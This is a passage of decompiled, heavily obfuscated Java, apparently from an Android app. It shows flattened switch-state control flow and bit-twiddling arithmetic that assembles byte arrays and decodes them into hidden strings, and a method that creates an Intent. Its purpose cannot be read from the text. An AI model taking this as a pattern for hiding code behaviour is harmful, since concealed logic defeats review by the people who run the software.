                    long j216 = (j215 | (j215 >>> 2)) & 252645135;
                    long j217 = j206 & 43690;
                    long j218 = ((j217 >>> 2) | (j217 >>> 1)) & 858993459;
                    long j219 = (j218 | (j218 >>> 2)) & 252645135;
                    bArr8[5] = (-1069462080) ^ (328217157 + (((int) (((j219 | (j219 >>> 4)) & 16711935) | ((((j216 | (j216 >>> 4)) & 16711935) << 8) | j213))) | 741244930));
                    bArr8[6] = -38;
                    bArr8[7] = -62;
                    k(bArr7, bArr8);
                    if (J(intern3, new String(bArr7, charset3).intern())) {
                        i = 0;
                        c4 = 1953;
                        i3 = i;
                    } else {
                        c4 = 15296;
                        i3 = 0;
                    }
                case 15296:
                    byte[] bArr9 = new byte[23];
                    bArr9[i3] = 97;
                    long j220 = -1673920491;
                    long j221 = -1;
                    long j222 = (((((j221 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j223 = (((((((j221 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j224 = (((((((j221 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j225 = (((((((j221 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j226 = (((((((((j220 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j220 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j220 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j220 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (j225 | j224 | (j223 + j222)) + 6148914691236517205L;
                    long j227 = (j226 >>> 48) & 43690;
                    long j228 = ((j227 >>> 2) | (j227 >>> 1)) & 858993459;
                    long j229 = ((j228 >>> 2) | j228) & 252645135;
                    long j230 = (j226 >>> 32) & 43690;
                    long j231 = ((j230 >>> 2) | (j230 >>> 1)) & 858993459;
                    long j232 = ((j231 >>> 2) | j231) & 252645135;
                    long j233 = ((((j232 >>> 4) | j232) & 16711935) << 16) + ((((j229 >>> 4) | j229) & 16711935) << 24);
                    long j234 = (j226 >>> 16) & 43690;
                    long j235 = ((j234 >>> 2) | (j234 >>> 1)) & 858993459;
                    long j236 = ((j235 >>> 2) | j235) & 252645135;
                    long j237 = j226 & 43690;
                    long j238 = ((j237 >>> 2) | (j237 >>> 1)) & 858993459;
                    long j239 = ((j238 >>> 2) | j238) & 252645135;
                    long j240 = -1015545628;
                    long j241 = (int) ((((j239 >>> 4) | j239) & 16711935) + ((((j236 >>> 4) | j236) & 16711935) << 8) + j233);
                    long j242 = ((((((((j240 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j240 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j240 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j240 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + ((((((((j241 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j241 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j241 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j241 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j243 = (j242 >>> 48) & 43690;
                    long j244 = ((j243 >>> 2) | (j243 >>> 1)) & 858993459;
                    long j245 = ((j244 >>> 2) | j244) & 252645135;
                    long j246 = (j242 >>> 32) & 43690;
                    long j247 = ((j246 >>> 2) | (j246 >>> 1)) & 858993459;
                    long j248 = ((j247 >>> 2) | j247) & 252645135;
                    long j249 = ((((j248 >>> 4) | j248) & 16711935) << 16) + ((((j245 >>> 4) | j245) & 16711935) << 24);
                    long j250 = (j242 >>> 16) & 43690;
                    long j251 = ((j250 >>> 2) | (j250 >>> 1)) & 858993459;
                    long j252 = ((j251 >>> 2) | j251) & 252645135;
                    long j253 = j242 & 43690;
                    long j254 = ((j253 >>> 2) | (j253 >>> 1)) & 858993459;
                    long j255 = ((j254 >>> 2) | j254) & 252645135;
                    int i7 = ((int) ((((j255 >>> 4) | j255) & 16711935) | ((((j252 >>> 4) | j252) & 16711935) << 8) | j249)) + 223248;
                    bArr9[1] = B0.a((~i7) | 1015322451, 1015322451 - i7);
                    bArr9[2] = 24;
                    bArr9[3] = -16;
                    bArr9[4] = 64;
                    bArr9[5] = -54;
                    bArr9[6] = -15;
                    bArr9[7] = 101;
                    bArr9[8] = -84;
                    bArr9[9] = 52;
                    bArr9[10] = 35;
                    bArr9[11] = 63;
                    bArr9[12] = -113;
                    bArr9[13] = -10;
                    long j256 = -55098358;
                    long j257 = j223 | j222;
                    long j258 = j224 | j257;
                    long b9 = c3.b((((((((j256 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j256 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j256 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j256 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j225 + j258, 6148914691236517205L);
                    long j259 = (b9 >>> 48) & 43690;
                    long j260 = ((j259 >>> 2) | (j259 >>> 1)) & 858993459;
                    long j261 = ((j260 >>> 2) | j260) & 252645135;
                    long j262 = (b9 >>> 32) & 43690;
                    long j263 = ((j262 >>> 2) | (j262 >>> 1)) & 858993459;
                    long j264 = ((j263 >>> 2) | j263) & 252645135;
                    long j265 = ((((j264 >>> 4) | j264) & 16711935) << 16) | ((((j261 >>> 4) | j261) & 16711935) << 24);
                    long j266 = (b9 >>> 16) & 43690;
                    long j267 = ((j266 >>> 2) | (j266 >>> 1)) & 858993459;
                    long j268 = ((j267 >>> 2) | j267) & 252645135;
                    long j269 = b9 & 43690;
                    long j270 = ((j269 >>> 2) | (j269 >>> 1)) & 858993459;
                    long j271 = ((j270 >>> 2) | j270) & 252645135;
                    bArr9[(-1643208896) ^ (167807559 - (~(((int) ((((j271 >>> 4) | j271) & 16711935) + (((((j268 >>> 4) | j268) & 16711935) << 8) | j265))) & (-1811016442))))] = -21;
                    bArr9[15] = 5;
                    bArr9[16] = -21;
                    bArr9[17] = -78;
                    bArr9[18] = 119;
                    bArr9[19] = 93;
                    bArr9[20] = 106;
                    bArr9[21] = -94;
                    bArr9[22] = 4;
                    k(bArr9, new byte[]{98, 97, -63, 3, 27, 93, 125, -41, 105, 30, -68, -2, -19, -92, 42, 93, 10, 20, -78, -72, 120, -75, 43});
                    Charset charset4 = StandardCharsets.UTF_8;
                    String intern4 = new String(bArr9, charset4).intern();
                    byte[] bArr10 = new byte[7];
                    long j272 = 26624324;
                    long j273 = ((((((((j272 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j272 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j272 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j272 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + (j225 | j258);
                    long j274 = (j273 >>> 48) & 43690;
                    long j275 = ((j274 >>> 2) | (j274 >>> 1)) & 858993459;
                    long j276 = ((j275 >>> 2) | j275) & 252645135;
                    long j277 = (j273 >>> 32) & 43690;
                    long j278 = ((j277 >>> 2) | (j277 >>> 1)) & 858993459;
                    long j279 = ((j278 >>> 2) | j278) & 252645135;
                    long j280 = ((((j279 >>> 4) | j279) & 16711935) << 16) | ((((j276 >>> 4) | j276) & 16711935) << 24);
                    long j281 = (j273 >>> 16) & 43690;
                    long j282 = ((j281 >>> 2) | (j281 >>> 1)) & 858993459;
                    long j283 = ((j282 >>> 2) | j282) & 252645135;
                    long j284 = j273 & 43690;
                    long j285 = ((j284 >>> 2) | (j284 >>> 1)) & 858993459;
                    long j286 = (j285 | (j285 >>> 2)) & 252645135;
                    int i8 = (int) (((j286 | (j286 >>> 4)) & 16711935) + ((((j283 >>> 4) | j283) & 16711935) << 8) + j280);
                    long j287 = 5160;
                    long j288 = i3;
                    long j289 = (((((j288 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j290 = (((((((j288 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j291 = (((((((j288 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j292 = (((((((j288 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long b10 = c3.b((((((((j287 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j287 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j287 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j287 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j292 + j291 + (j290 | j289), 6148914691236517205L);
                    long j293 = (b10 >>> 48) & 43690;
                    long j294 = ((j293 >>> 2) | (j293 >>> 1)) & 858993459;
                    long j295 = ((j294 >>> 2) | j294) & 252645135;
                    long j296 = (b10 >>> 32) & 43690;
                    long j297 = ((j296 >>> 2) | (j296 >>> 1)) & 858993459;
                    long j298 = ((j297 >>> 2) | j297) & 252645135;
                    long j299 = ((((j298 >>> 4) | j298) & 16711935) << 16) | ((((j295 >>> 4) | j295) & 16711935) << 24);
                    long j300 = (b10 >>> 16) & 43690;
                    long j301 = ((j300 >>> 2) | (j300 >>> 1)) & 858993459;
                    long j302 = ((j301 >>> 2) | j301) & 252645135;
                    long j303 = b10 & 43690;
                    long j304 = ((j303 >>> 2) | (j303 >>> 1)) & 858993459;
                    long j305 = ((j304 >>> 2) | j304) & 252645135;
                    bArr10[26629484 ^ (i8 + ((int) ((((j305 >>> 4) | j305) & 16711935) + (((((j302 >>> 4) | j302) & 16711935) << 8) | j299))))] = 71;
                    bArr10[1] = 62;
                    bArr10[2] = -29;
                    long j306 = -2004746176;
                    long h3 = (((((((((j306 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j306 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j306 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j306 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + AbstractC0008a.h(j290, j289, j291, j292) + 6148914691236517205L;
                    long j307 = (h3 >>> 48) & 43690;
                    long j308 = ((j307 >>> 2) | (j307 >>> 1)) & 858993459;
                    long j309 = ((j308 >>> 2) | j308) & 252645135;
                    long j310 = (h3 >>> 32) & 43690;
                    long j311 = ((j310 >>> 2) | (j310 >>> 1)) & 858993459;
                    long j312 = ((j311 >>> 2) | j311) & 252645135;
                    long j313 = ((((j312 >>> 4) | j312) & 16711935) << 16) + ((((j309 >>> 4) | j309) & 16711935) << 24);
                    long j314 = (h3 >>> 16) & 43690;
                    long j315 = ((j314 >>> 2) | (j314 >>> 1)) & 858993459;
                    long j316 = ((j315 >>> 2) | j315) & 252645135;
                    long j317 = h3 & 43690;
                    long j318 = ((j317 >>> 2) | (j317 >>> 1)) & 858993459;
                    long j319 = ((j318 >>> 2) | j318) & 252645135;
                    int i9 = 910250507 + ((int) ((((j319 >>> 4) | j319) & 16711935) | (((((j316 >>> 4) | j316) & 16711935) << 8) + j313)));
                    long j320 = -1094495672;
                    long j321 = i9;
                    long j322 = (((((((((j320 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j320 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j320 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j320 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + (((((((((j321 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j321 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j321 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j321 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))));
                    long j323 = (j322 >>> 48) & 21845;
                    long j324 = ((j323 >>> 1) | j323) & 858993459;
                    long j325 = ((j324 >>> 2) | j324) & 252645135;
                    long j326 = (j322 >>> 32) & 21845;
                    long j327 = ((j326 >>> 1) | j326) & 858993459;
                    long j328 = ((j327 >>> 2) | j327) & 252645135;
                    long j329 = ((((j328 >>> 4) | j328) & 16711935) << 16) | ((((j325 >>> 4) | j325) & 16711935) << 24);
                    long j330 = (j322 >>> 16) & 21845;
                    long j331 = ((j330 >>> 1) | j330) & 858993459;
                    long j332 = ((j331 >>> 2) | j331) & 252645135;
                    long j333 = ((((j332 >>> 4) | j332) & 16711935) << 8) + j329;
                    long j334 = j322 & 21845;
                    long j335 = (j334 | (j334 >>> 1)) & 858993459;
                    long j336 = (j335 | (j335 >>> 2)) & 252645135;
                    bArr10[(int) (((j336 | (j336 >>> 4)) & 16711935) + j333)] = -59;
                    bArr10[4] = 39;
                    bArr10[5] = -3;
                    bArr10[6] = -104;
                    byte[] bArr11 = new byte[8];
                    bArr11[i3] = -119;
                    bArr11[1] = -4;
                    bArr11[2] = -104;
                    long j337 = 1513486162;
                    long b11 = c3.b((((((((j337 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j337 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j337 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j337 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j224 + j257 + j225, 6148914691236517205L);
                    long j338 = (b11 >>> 48) & 43690;
                    long j339 = ((j338 >>> 2) | (j338 >>> 1)) & 858993459;
                    long j340 = ((j339 >>> 2) | j339) & 252645135;
                    long j341 = (b11 >>> 32) & 43690;
                    long j342 = ((j341 >>> 2) | (j341 >>> 1)) & 858993459;
                    long j343 = ((j342 >>> 2) | j342) & 252645135;
                    long j344 = ((((j343 >>> 4) | j343) & 16711935) << 16) + ((((j340 >>> 4) | j340) & 16711935) << 24);
                    long j345 = (b11 >>> 16) & 43690;
                    long j346 = ((j345 >>> 2) | (j345 >>> 1)) & 858993459;
                    long j347 = ((j346 >>> 2) | j346) & 252645135;
                    long j348 = b11 & 43690;
                    long j349 = ((j348 >>> 1) | (j348 >>> 2)) & 858993459;
                    long j350 = (j349 | (j349 >>> 2)) & 252645135;
                    bArr11[((((int) (((j350 | (j350 >>> 4)) & 16711935) | (((((j347 >>> 4) | j347) & 16711935) << 8) | j344))) & 807731718) + 68196353) ^ 875928068] = 87;
                    bArr11[4] = -30;
                    bArr11[5] = -98;
                    bArr11[6] = 91;
                    bArr11[7] = -11;
                    k(bArr10, bArr11);
                    if (J(intern4, new String(bArr10, charset4).intern())) {
                        i = i3;
                        c4 = 1953;
                        i3 = i;
                    } else {
                        c4 = 56689;
                    }
                case 13077:
                    break;
                default:
                    c4 = 13077;
            }
            return z3;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final boolean Q(Context context) {
        char c4;
        Charset charset;
        String intern;
        byte[] bArr;
        byte b4 = 0;
        char c5 = 23569;
        Intent intent = null;
        Exception e4 = null;
        boolean z3 = false;
        while (true) {
            switch (c5) {
                case 43962:
                    return b4;
                case 760:
                    return b4;
                case 56286:
                    return z3;
                case 23569:
                    intent = new Intent();
                    long j2 = -1;
                    long j3 = b4;
                    long j4 = (((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j5 = (((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j6 = j5 + j4;
                    long j7 = (((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j8 = (((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j9 = j8 | (j7 + j6);
                    long j10 = (((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                    long j11 = (((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                    long j12 = (((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                    long j13 = (((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                    long j14 = j13 | j12 | (j11 + j10);
                    long j15 = j14 + j9;
                    long j16 = (j15 >>> 48) & 21845;
                    long j17 = ((j16 >>> 1) | j16) & 858993459;
                    long j18 = ((j17 >>> 2) | j17) & 252645135;
                    long j19 = (j15 >>> 32) & 21845;
                    long j20 = ((j19 >>> 1) | j19) & 858993459;
                    long j21 = ((j20 >>> 2) | j20) & 252645135;
                    long j22 = ((((j21 >>> 4) | j21) & 16711935) << 16) + ((((j18 >>> 4) | j18) & 16711935) << 24);
                    long j23 = (j15 >>> 16) & 21845;
                    long j24 = ((j23 >>> 1) | j23) & 858993459;
                    long j25 = ((j24 >>> 2) | j24) & 252645135;
                    long j26 = j15 & 21845;
                    long j27 = ((j26 >>> 1) | j26) & 858993459;
                    long j28 = ((j27 >>> 2) | j27) & 252645135;
                    byte[] bArr2 = {(((((int) ((((j28 >>> 4) | j28) & 16711935) | (((((j25 >>> 4) | j25) & 16711935) << 8) | j22))) | 233705521) & 67766088) + 572524544) ^ 640290578, -117, 48, 13, 2, -107, 122, 44, -108, 26, 94, -113, -113, -4, 36, -35, -75, 50, Byte.MIN_VALUE, 74, 32, -31};
                    x(bArr2, new byte[]{57, -28, 93, 35, 118, -26, 20, 75, -70, 114, 55, -21, -22, -111, 93, -68, -59, 66, -20, 35, 83, -107});
                    Charset charset2 = StandardCharsets.UTF_8;
                    String intern2 = new String(bArr2, charset2).intern();
                    byte[] bArr3 = new byte[43];
                    bArr3[b4] = 125;
                    bArr3[1] = 36;
                    bArr3[2] = 92;
                    bArr3[3] = -107;
                    bArr3[4] = -12;
                    bArr3[5] = -48;
                    bArr3[6] = 19;
                    bArr3[7] = 6;
                    bArr3[8] = -5;
                    bArr3[9] = -44;
                    bArr3[10] = Byte.MIN_VALUE;
                    bArr3[11] = 56;
                    bArr3[12] = -69;
                    bArr3[13] = 55;
                    bArr3[14] = 114;
                    bArr3[15] = -100;
                    bArr3[16] = 34;
                    bArr3[17] = 28;
                    byte b5 = b4;
                    long j29 = -1073741439;
                    long j30 = ((((((((j29 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j29 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j29 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j29 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j9;
                    long j31 = (j30 >>> 48) & 43690;
                    long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                    long j33 = ((j32 >>> 2) | j32) & 252645135;
                    long j34 = (j30 >>> 32) & 43690;
                    long j35 = ((j34 >>> 2) | (j34 >>> 1)) & 858993459;
                    long j36 = ((j35 >>> 2) | j35) & 252645135;
                    long j37 = ((((j36 >>> 4) | j36) & 16711935) << 16) | ((((j33 >>> 4) | j33) & 16711935) << 24);
                    long j38 = (j30 >>> 16) & 43690;
                    long j39 = ((j38 >>> 2) | (j38 >>> 1)) & 858993459;
                    long j40 = ((j39 >>> 2) | j39) & 252645135;
                    long j41 = j30 & 43690;
                    long j42 = ((j41 >>> 2) | (j41 >>> 1)) & 858993459;
                    long j43 = ((j42 >>> 2) | j42) & 252645135;
                    bArr3[18] = (-992507393) ^ ((-2070773686) + (((int) ((((j43 >>> 4) | j43) & 16711935) + (((((j40 >>> 4) | j40) & 16711935) << 8) | j37))) | 1078266241));
                    bArr3[19] = b5;
                    bArr3[20] = 18;
                    bArr3[21] = 57;
                    bArr3[22] = 34;
                    bArr3[23] = -107;
                    bArr3[24] = -17;
                    bArr3[25] = -89;
                    bArr3[26] = 121;
                    bArr3[27] = 96;
                    bArr3[28] = Byte.MIN_VALUE;
                    bArr3[29] = 71;
                    bArr3[30] = 27;
                    bArr3[31] = -60;
                    bArr3[32] = -67;
                    bArr3[33] = -75;
                    bArr3[34] = 46;
                    bArr3[35] = 100;
                    bArr3[36] = 79;
                    bArr3[37] = -88;
                    bArr3[38] = -84;
                    bArr3[39] = 32;
                    bArr3[40] = 11;
                    bArr3[41] = 119;
                    bArr3[42] = 51;
                    byte[] bArr4 = new byte[43];
                    bArr4[b5] = 30;
                    bArr4[1] = 75;
                    bArr4[2] = 49;
                    bArr4[3] = -69;
                    bArr4[4] = Byte.MIN_VALUE;
                    bArr4[5] = -93;
                    bArr4[6] = 125;
                    bArr4[7] = 97;
                    bArr4[8] = -43;
                    bArr4[9] = -68;
                    bArr4[10] = -23;
                    long b6 = c3.b(j12, j11 | j10, j13, j8 + (j7 | j5 | j4));
                    long j44 = (b6 >>> 48) & 21845;
                    long j45 = ((j44 >>> 1) | j44) & 858993459;
                    long j46 = ((j45 >>> 2) | j45) & 252645135;
                    long j47 = (b6 >>> 32) & 21845;
                    long j48 = ((j47 >>> 1) | j47) & 858993459;
                    long j49 = ((j48 >>> 2) | j48) & 252645135;
                    long j50 = ((((j49 >>> 4) | j49) & 16711935) << 16) + ((((j46 >>> 4) | j46) & 16711935) << 24);
                    long j51 = (b6 >>> 16) & 21845;
                    long j52 = ((j51 >>> 1) | j51) & 858993459;
                    long j53 = ((j52 >>> 2) | j52) & 252645135;
                    long j54 = b6 & 21845;
                    long j55 = ((j54 >>> 1) | j54) & 858993459;
                    long j56 = ((j55 >>> 2) | j55) & 252645135;
                    bArr4[11] = (((((int) ((((j56 >>> 4) | j56) & 16711935) + (((((j53 >>> 4) | j53) & 16711935) << 8) | j50))) | (-2076134284)) & 6718496) - 1610612719) ^ (-1603894163);
                    bArr4[12] = -34;
                    bArr4[13] = 90;
                    bArr4[14] = 11;
                    bArr4[15] = -3;
                    bArr4[16] = 82;
                    bArr4[17] = 108;
                    bArr4[18] = 88;
                    bArr4[19] = 105;
                    long j57 = 45090948;
                    long j58 = b5;
                    long b7 = c3.b((((((((j57 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j57 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j57 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j57 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j58 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j58 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j58 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j58 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))), 6148914691236517205L);
                    long j59 = (b7 >>> 48) & 43690;
                    long j60 = ((j59 >>> 2) | (j59 >>> 1)) & 858993459;
                    long j61 = ((j60 >>> 2) | j60) & 252645135;
                    long j62 = (b7 >>> 32) & 43690;
                    long j63 = ((j62 >>> 2) | (j62 >>> 1)) & 858993459;
                    long j64 = ((j63 >>> 2) | j63) & 252645135;
                    long j65 = ((((j64 >>> 4) | j64) & 16711935) << 16) | ((((j61 >>> 4) | j61) & 16711935) << 24);
                    long j66 = (b7 >>> 16) & 43690;
                    long j67 = ((j66 >>> 2) | (j66 >>> 1)) & 858993459;
                    long j68 = ((j67 >>> 2) | j67) & 252645135;
                    long j69 = b7 & 43690;
                    long j70 = ((j69 >>> 2) | (j69 >>> 1)) & 858993459;
                    long j71 = ((j70 >>> 2) | j70) & 252645135;
                    bArr4[20] = 452521893 ^ (407430976 + ((int) ((((j71 >>> 4) | j71) & 16711935) | (((((j68 >>> 4) | j68) & 16711935) << 8) + j65))));
                    bArr4[21] = 77;
                    bArr4[22] = 12;
                    bArr4[23] = -40;
                    bArr4[24] = -114;
                    bArr4[25] = -50;
                    bArr4[26] = 23;
                    bArr4[27] = 33;
                    bArr4[28] = -29;
                    bArr4[29] = 51;
                    bArr4[30] = 114;
                    bArr4[31] = -78;
                    bArr4[32] = -44;
                    bArr4[33] = -63;
                    bArr4[34] = 87;
                    long j72 = j14 + (j7 | j6 | j8);
                    long j73 = (j72 >>> 48) & 21845;
                    long j74 = (j73 | (j73 >>> 1)) & 858993459;
                    long j75 = (j74 | (j74 >>> 2)) & 252645135;
                    long j76 = (j72 >>> 32) & 21845;
                    long j77 = ((j76 >>> 1) | j76) & 858993459;
                    long j78 = ((j77 >>> 2) | j77) & 252645135;
                    long j79 = (((j75 | (j75 >>> 4)) & 16711935) << 24) | ((((j78 >>> 4) | j78) & 16711935) << 16);
                    long j80 = (j72 >>> 16) & 21845;
                    long j81 = ((j80 >>> 1) | j80) & 858993459;
                    long j82 = ((j81 >>> 2) | j81) & 252645135;
                    long j83 = j72 & 21845;
                    long j84 = (j83 | (j83 >>> 1)) & 858993459;
                    long j85 = (j84 | (j84 >>> 2)) & 252645135;
                    int i = (int) (j79 | ((((j82 >>> 4) | j82) & 16711935) << 8) | ((j85 | (j85 >>> 4)) & 16711935));
                    long j86 = 1314634948;
                    long j87 = i;
                    long b8 = c3.b((((((((j86 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j86 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j86 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j86 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j87 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j87 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j87 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j87 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), 6148914691236517205L);
                    long j88 = (b8 >>> 48) & 43690;
                    long j89 = ((j88 >>> 2) | (j88 >>> 1)) & 858993459;
                    long j90 = (j89 | (j89 >>> 2)) & 252645135;
                    long j91 = (b8 >>> 32) & 43690;
                    long j92 = ((j91 >>> 2) | (j91 >>> 1)) & 858993459;
                    long j93 = ((j92 >>> 2) | j92) & 252645135;
                    long j94 = ((((j93 >>> 4) | j93) & 16711935) << 16) + (((j90 | (j90 >>> 4)) & 16711935) << 24);
                    long j95 = (b8 >>> 16) & 43690;
                    long j96 = ((j95 >>> 2) | (j95 >>> 1)) & 858993459;
                    long j97 = ((j96 >>> 2) | j96) & 252645135;
                    long j98 = b8 & 43690;
                    long j99 = ((j98 >>> 2) | (j98 >>> 1)) & 858993459;
